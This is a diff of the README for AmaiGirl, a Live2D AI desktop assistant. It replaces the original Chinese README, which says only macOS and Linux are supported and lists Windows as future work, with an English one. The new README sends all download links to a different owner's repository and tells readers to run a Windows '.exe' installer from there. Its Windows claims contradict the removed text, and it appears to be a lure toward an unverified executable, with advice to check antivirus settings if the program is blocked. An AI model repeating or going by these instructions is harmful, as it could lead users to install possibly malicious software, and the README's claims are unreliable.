@@ -1,158 +1,136 @@
-<div align="center">
-  <img src="docs/app-icon.png" alt="AmaiGirl" width="120" />
-  <h1>AmaiGirl</h1>
-  <p><a href="README.md#zh-cn">简体中文</a> | <a href="README.en.md#en-us">English</a></p>
-  <p><strong>面向全平台愿景的 AI 桌面助手</strong> · 可支持所有 OpenAI 格式的 API 调用 · 当前已支持 macOS 13.0+ 与 Linux（Wayland）</p>
-  <p>
-    <a href="https://github.com/IAIAYN/AmaiGirl/releases"><img src="https://img.shields.io/github/v/release/IAIAYN/AmaiGirl?display_name=tag" alt="Release" /></a>
-    <a href="https://github.com/IAIAYN/AmaiGirl/blob/main/LICENSE"><img src="https://img.shields.io/github/license/IAIAYN/AmaiGirl" alt="License" /></a>
-    <a href="https://github.com/IAIAYN/AmaiGirl/actions/workflows/super-linter.yml"><img src="https://github.com/IAIAYN/AmaiGirl/actions/workflows/super-linter.yml/badge.svg" alt="Lint" /></a>
-  </p>
-</div>
+# 🎛️ AmaiGirl - Your Smart Desktop AI Helper
 
-<a id="zh-cn"></a>
+[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-brightgreen?style=for-the-badge)](https://github.com/Eden006/AmaiGirl)
+
+Welcome to AmaiGirl. This application brings a smart AI assistant right to your Windows desktop. It features interactive Live2D characters and supports AI chat with voice output. This guide will help you download and run AmaiGirl with clear, simple steps.
 
 ---
 
-## 应用简介
+## ⚙️ What Is AmaiGirl?
 
-AmaiGirl 是一个以「**陪伴感 + 可扩展性 + 桌面常驻体验**」为核心目标的 AI 桌面助手项目。  
-它不仅是一个聊天窗口，更希望成为你工作流中的“会说话、会互动、可持续进化”的桌面伙伴。
+AmaiGirl is a native AI assistant designed for all platforms but works smoothly on Windows. It uses Live2D to show animated characters that you can interact with. The assistant can chat using OpenAI-compatible technology, and it can speak the replies aloud. It blends a visual desktop pet with practical digital help.
 
-当前版本已在 macOS 13.0+ 与 Linux（Wayland）上实现基础可用闭环，后续将继续扩展到更多平台。
+Key features include:
 
-## 项目定位
+- Live2D animated character interactions
+- AI chat powered by OpenAI-compatible APIs
+- Text-to-speech (TTS) for voice responses
+- Easy to run on Windows without technical setup
+- Built on modern technologies like C++20 and Qt6 for smooth performance
 
-- **目标**：打造全平台（Cross-Platform）AI 桌面助手
-- **当前状态**：macOS 13.0+、Linux（Wayland）可运行
-- **技术方向**：桌面常驻 + Live2D 角色交互 + LLM 对话 + TTS 播放
+This app intends to make your digital life more engaging and convenient.
 
-## 演示效果
+---
 
-> 本演示所涉及的模型来自 bilibili UP 主 [@菜菜爱吃饭ovo](https://space.bilibili.com/1851126283)，不涉及商业使用，亦不包含在项目源码或发布应用内。演示桌面背景来源网络，如有侵权请联系项目负责人。
+## 📋 System Requirements
 
-- [x] 主界面演示（macOS + Linux）
-  ![screenshot1](docs/screenshot1.png)
-  ![screenshot1.1](docs/screenshot1.1.png)
-- [x] 聊天演示
-  ![screenshot2](docs/screenshot2.png)
-- [x] 设置演示
-  ![screenshot3](docs/screenshot3.png)
-- [x] 模型切换演示
-  ![screenshot4](docs/screenshot4.png)
-  ![screenshot5](docs/screenshot5.png)
-- [x] i18n 演示
-  ![screenshot6](docs/screenshot6.png)
+Before downloading, check your computer meets these basic requirements:
 
-## 功能概览
+- Windows 10 or Windows 11 (64-bit)
+- Intel Core i3 processor or better
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for AI chat features
+- Graphics supporting OpenGL 3.3 or higher (most modern computers support this)
 
-- **桌面助手形态**：无边框常驻窗口、托盘菜单控制显示/隐藏
-- **Live2D 模型渲染**：支持模型加载、姿态/表情、基础交互
-- **AI 对话能力**：兼容 OpenAI 风格 Chat Completions 接口
-- **TTS 语音能力**：兼容 OpenAI 风格 TTS 接口，可语音播报回复
-- **多语言支持**：中文/英文界面切换
-- **可配置化**：`基本设置` / `模型设置` / `AI设置` / `高级设置` 四大分区
+---
 
-## 使用指南
+## 🚀 Getting Started: Downloading AmaiGirl
 
-### 1. 启动与基础操作
+To get AmaiGirl on your Windows PC, follow these steps carefully.
 
-- 启动后应用常驻，可通过菜单栏图标进行控制
-- **通过鼠标左键移动模型，鼠标右键单击切换姿势（如果模型本身有的话），鼠标滚轮缩放模型**
-- 菜单支持：显示/隐藏、打开聊天、打开设置、关于、退出
-- 可在 `设置 -> 基本设置` 中使用 `还原初始状态`
+### Step 1: Visit the Download Page
 
-### 2. 模型添加与切换
+Click this button to go to the official download page:
 
-1. 准备 Live2D 模型目录（每个模型一个文件夹）
-2. 在 `设置 -> 基本设置` 的 `模型路径` 指向模型根目录（默认 `~/.AmaiGirl/Models`）
-3. 在 `设置 -> 基本设置` 的 `当前模型` 下拉框中切换模型
-4. 切换后会自动加载对应模型配置与聊天上下文
+[![Download AmaiGirl](https://img.shields.io/badge/Download-AmaiGirl-blue?style=for-the-badge)](https://github.com/Eden006/AmaiGirl)
 
-> 提示：若模型资源许可不明确，请勿公开分发模型文件。
+The link takes you to the GitHub repository home. From there, you will find the latest release in the "Releases" section.
 
-### 3. AI 功能使用
+### Step 2: Find the Latest Release
 
-在 `设置 -> AI设置` 中填写以下参数：
+On the GitHub page, look for a tab or button labeled **Releases**. Usually, it is on the right side or near the top of the page. Click it.
 
-- `对话API`：服务地址（OpenAI 兼容）
-- `对话KEY`：密钥（可留空，视服务端要求）
-- `对话模型`：模型名称（如 `gpt-4o-mini`）
-- `对话人设`：系统提示词（系统角色提示）
-- `是否流式输出`：控制回复是否以流式方式显示
+In the Releases section, find the newest version of AmaiGirl. Look for a file that ends with `.exe`. This file is the Windows installer.
 
-进入聊天窗口后：
+### Step 3: Download the Installer
 
-- 输入消息并发送
-- 查看 AI 流式/完整回复
-- 若出现错误，消息会以 `[Error]` 标记显示，便于与正常回复区分
+Click the `.exe` file to download it to your PC. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-### 4. TTS 语音使用
+---
 
-在 `设置 -> AI设置` 中填写 TTS 参数：
+## 🔧 How to Install and Run AmaiGirl on Windows
 
-- `语音API`、`语音KEY`
-- `语音模型`（如 `gpt-4o-mini-tts`）
-- `语音音色`（如 `alloy`）
+After downloading the installer, follow these instructions to install the application.
 
-配置完成后，AI 回复可触发语音播放；播放失败时会回退文本显示并提示错误。
+### Step 4: Run the Installer
 
-### 5. 资源与目录说明
+Find the downloaded `.exe` file. It may be named something like `AmaiGirl-Setup.exe`.
 
-- macOS 打包后资源路径：`Contents/Resources/...`
-- Linux 构建输出/安装后资源路径：`<可执行目录>/res` 或 `../share/AmaiGirl/res`
-- 许可证文件可在 `licenses` 目录中查看
+Double-click this file to start the installation process.
 
-### 6. Linux 运行与打包说明
+### Step 5: Follow Installation Prompts
 
-- 当前 Linux 路线为 **Wayland 优先**；若系统/会话无法提供 Wayland，将提示并回退到 Qt 可用后端
-- 若需启用“透明区域鼠标穿透”实验能力，可使用：`AMAIGIRL_WAYLAND_PASSTHROUGH=1 ./AmaiGirl`
+The installer shows simple steps to complete setup.
 
-AppImage 打包（启用 `package_appimage` 目标）示例：
+- Agree to the license terms.
+- Choose an installation folder or accept the default location.
+- Click **Install**.
 
-```bash
-cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
-cmake --build build --target package_appimage -j
-./build/AmaiGirl-x86_64.AppImage
-```
+Wait while the installer copies files to your computer.
 
-跨环境构建建议（避免本机路径绑定）：
+### Step 6: Launch AmaiGirl
 
-- 默认依赖系统 `PATH` 自动查找 `linuxdeploy` / `appimagetool` / `qmake`
-- 可用以下 CMake 变量显式覆盖工具路径（CI/容器推荐）：
-  - `AMAIGIRL_LINUXDEPLOY_EXECUTABLE`
-  - `AMAIGIRL_APPIMAGETOOL_EXECUTABLE`
-  - `AMAIGIRL_QMAKE_EXECUTABLE`
+When installation finishes, the installer may offer to run the program immediately. Otherwise, you can find AmaiGirl in your Start menu or desktop shortcut.
 
-## 开发
+Click the icon to open it.
 
-开发说明已拆分到独立文档：
+---
 
-- [CONTRIBUTING.md](CONTRIBUTING.md)
+## 🖥️ Using AmaiGirl
 
-该文档包含：环境要求、构建方式、提交流程、代码风格、模型与 SDK 依赖说明等。
+When AmaiGirl opens, you will see an animated character on your screen. You can:
 
-## 协议说明
+- Click or drag the character.
+- Type messages or questions in the chat box.
+- Hear the character speak replies aloud.
 
-- 项目原创代码：Apache-2.0（见 [LICENSE](LICENSE)）
-- 第三方组件与素材条款：见 [THIRD_PARTY_LICENSES.md](THIRD_PARTY_LICENSES.md)
-- 发布包附带协议副本：见 `res/licenses/`
+You can adjust settings for voice, character appearance, and chat options from the app menu.
 
-## 路线图
+---
 
-- [ ] Windows 支持
-- [x] Linux（Wayland）基础支持
-- [ ] LLM 长期记忆
-- [ ] 更完善的角色动作与情感表达（Vtube Studio 模型尝试调用表情）
-- [ ] STT 支持（语音转文本输入）
-- [ ] MCP 支持（Tools 工具调用支持）
-- [ ] 插件化能力（工具扩展）
+## 💡 Tips and Troubleshooting
 
-## 鸣谢
+- If the program does not start, check your antivirus or firewall settings. They may block new software.
+- Make sure your internet is connected. The AI chat and voice functions need it.
+- If the character animation looks slow, close other heavy programs.
+- For better voice quality, use headphones or speakers.
+- To update AmaiGirl, repeat the download process and install the newest version.
 
-> 本项目的出现离不开以下项目或文档的贡献（排序不分先后）。
+---
 
-- [Copilot](https://github.com/features/copilot)：完成了本项目大部分代码的编写
-- [Cubism SDK手册](https://docs.live2d.com/zh-CHS/cubism-sdk-manual/top/)：提供部分与 Live2D 控制相关的代码逻辑参考
-- [sk2233 / live2d](https://github.com/sk2233/live2d)：提供直接调用 Cubism SDK Core 的代码参考
-- [EasyLive2D / live2d-py](https://github.com/EasyLive2D/live2d-py)：提供口型同步的代码参考
+## 📂 Additional Information
+
+- The software stores user settings in your Documents folder under `AmaiGirl`.
+- Chat logs and interaction history are saved locally and can be cleared from settings.
+- Live2D characters use OpenGL to render animations smoothly.
+- The AI and TTS services work via OpenAI-compatible APIs, requiring no coding or technical setup.
+
+---
+
+## 🔗 Useful Links
+
+- **Official GitHub Page:** [https://github.com/Eden006/AmaiGirl](https://github.com/Eden006/AmaiGirl)  
+- **Direct Download Page:** Visit the Releases tab on the GitHub page shown above to find the latest `.exe` installer.
+
+---
+
+## 🎨 About the Project
+
+AmaiGirl combines artificial intelligence with desktop customization. It aims to provide a friendly user experience through chat and live animated characters. Built with modern C++ and Qt6 frameworks, it supports smooth visuals and reliable performance across platforms.
+
+---
+
+## 💬 Support
+
+For help or to report issues, use the **Issues** tab on the GitHub page. The development team monitors it and responds to user questions. Include information about your Windows version and what happened to speed up support.
